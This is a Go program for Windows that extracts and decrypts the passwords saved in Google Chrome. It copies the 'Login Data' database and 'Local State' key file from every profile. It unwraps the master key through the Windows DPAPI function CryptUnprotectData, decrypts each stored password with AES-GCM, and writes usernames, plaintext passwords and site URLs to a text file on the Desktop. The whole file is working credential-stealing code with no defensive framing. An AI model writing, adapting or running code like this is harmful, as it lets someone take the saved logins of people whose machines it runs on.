package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"errors"
	"github.com/gookit/slog"
	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"
	"io"
	"io/ioutil"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

func main() {

	//log.Init("debug")
	//

	defer slog.MustFlush()
	userPath, _ = os.UserHomeDir()

	// DangerLevels 包含： slog.PanicLevel, slog.ErrorLevel, slog.WarnLevel
	//h1 := handler.MustFileHandler(userPath+"\\Desktop\\error.log", handler.WithLogLevels(slog.DangerLevels))

	// NormalLevels 包含： slog.InfoLevel, slog.NoticeLevel, slog.DebugLevel, slog.TraceLevel
	//h2 := handler.MustFileHandler(userPath+"\\Desktop\\info.log", handler.WithLogLevels(slog.NormalLevels))

	//slog.PushHandler(h1)
	//slog.PushHandler(h2)

	sqLite()
}

var (
	userPath, _ = os.UserHomeDir() //保存的密码存到了logindata数据库sqlite
	localData   = userPath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	localState  = userPath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	cd          = userPath + "\\AppData\\Local\\Google\\Chrome\\User Data\\"
	//这里是我临时存放这两个文件的目录位置，当然也可以copy到指定目录
	temporarydb  = userPath + "\\Desktop\\Login Data"
	temporarykey = userPath + "\\Desktop\\Local State"
)

type chromeDB struct {
	Origin_url     string `json:"origin_url"`
	Action_url     string `json:"action_url"`
	Username_value string `json:"username_value"`
	Password_value string `json:"password_value"`
}

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func sqLite() {

	f1, err := OpenFile(userPath + "\\Desktop\\密码.txt")
	fileInfoList, err := ioutil.ReadDir(cd)
	for i := range fileInfoList {
		fileInfo := fileInfoList[i]
		if fileInfo.IsDir() {
			if strings.HasPrefix(fileInfo.Name(), "Profile") || strings.HasPrefix(fileInfo.Name(), "Default") {
				Wr(cd+fileInfo.Name()+"\\Login Data", f1)
			}
		}
	}
	checkErr(err, "OpenFile")

	err = os.Remove(temporarykey)
	checkErr(err, "os.Remove(temporarykey)")

	err = f1.Close()
	if err != nil {
		return
	}
}

func Wr(localDataTemp string, f1 *os.File) {
	var chrome chromeDB
	_, err := CopyFile(temporarydb, localDataTemp)
	checkErr(err, "0")
	_, err = CopyFile(temporarykey, localState)
	checkErr(err, "0")
	db, err := sql.Open("sqlite3", temporarydb)
	checkErr(err, "1")

	sqlQuery := "SELECT origin_url,action_url, username_value, password_value FROM logins"
	rows, err := db.Query(sqlQuery)
	checkErr(err, "2")

	for rows.Next() {

		err = rows.Scan(&chrome.Origin_url, &chrome.Action_url, &chrome.Username_value, &chrome.Password_value)
		checkErr(err, "3")

		key, err := GetMasterKey()
		checkErr(err, "4")

		pass, err := Chromium([]byte(key), []byte(chrome.Password_value))
		checkErr(err, "5")

		txt := chrome.Username_value + ": " + string(pass) + "url: " + chrome.Origin_url + "\n"
		w := bufio.NewWriter(f1) //创建新的 Writer 对象
		_, err = w.Write([]byte(txt))
		checkErr(err, "Write")
		err = w.Flush()
		if err != nil {
			return
		}
	}
	err = db.Close()
	checkErr(err, "db.Close()")
	err = os.Remove(temporarydb)
	checkErr(err, "os.Remove(temporarydb)")

}

var (
	errPasswordIsEmpty       = errors.New("password is empty")
	errDecodeMasterKeyFailed = errors.New("decode master key failed")
)

func Chromium(key, encryptPass []byte) ([]byte, error) {
	if len(encryptPass) > 15 { // remove Prefix 'v10'
		return aesGCMDecrypt(encryptPass[15:], key, encryptPass[3:15])
	} else {
		return nil, errPasswordIsEmpty
	}
}

func GetMasterKey() ([]byte, error) {
	keyFile, err := ioutil.ReadFile(temporarykey)
	if err != nil {
		return nil, err
	}
	defer os.Remove(string(keyFile))
	encryptedKey := gjson.Get(string(keyFile), "os_crypt.encrypted_key")
	if !encryptedKey.Exists() {
		return nil, nil
	}

	pureKey, err := base64.StdEncoding.DecodeString(encryptedKey.String())
	if err != nil {
		return nil, errDecodeMasterKeyFailed
	} //去除首位5个字符DPAPI
	masterKey, err := DPApi(pureKey[5:])

	checkErr(err, "6")

	return masterKey, err

}

func NewBlob(d []byte) *dataBlob {
	if len(d) == 0 {
		return &dataBlob{}
	}
	return &dataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *dataBlob) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func DPApi(data []byte) ([]byte, error) {
	dllCrypt := syscall.NewLazyDLL("Crypt32.dll")
	dllKernel := syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData := dllCrypt.NewProc("CryptUnprotectData")
	procLocalFree := dllKernel.NewProc("LocalFree")
	var outBlob dataBlob
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	return outBlob.ToByteArray(), nil
}

func aesGCMDecrypt(crypted, key, nounce []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	origData, err := blockMode.Open(nil, nounce, crypted, nil)
	if err != nil {
		return nil, err
	}
	return origData, nil
}

func checkErr(err error, str string) {
	if err != nil {
		slog.Error(str)
		slog.Error(err)
	}
}

func CopyFile(dstFileName string, srcFileName string) (written int64, err error) {
	srcfile, err := os.Open(srcFileName)
	if err != nil {
		checkErr(err, "open file error")
		return
	}
	defer srcfile.Close()

	//通过srcfile，获取到reader
	reader := bufio.NewReader(srcfile)

	//打开dstFileName，因为这个文件可能不存在，所以不能使用os.open打开
	dstFile, err := os.OpenFile(dstFileName, os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		checkErr(err, "open fil error")
		return
	}
	defer dstFile.Close()
	//通过dstFile，获取writer
	writer := bufio.NewWriter(dstFile)

	return io.Copy(writer, reader)
}

func OpenFile(filename string) (*os.File, error) {
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		checkErr(err, "文件不存在")
		return os.Create(filename) //创建文件
	}
	return os.OpenFile(filename, os.O_APPEND, 0666) //打开文件
}
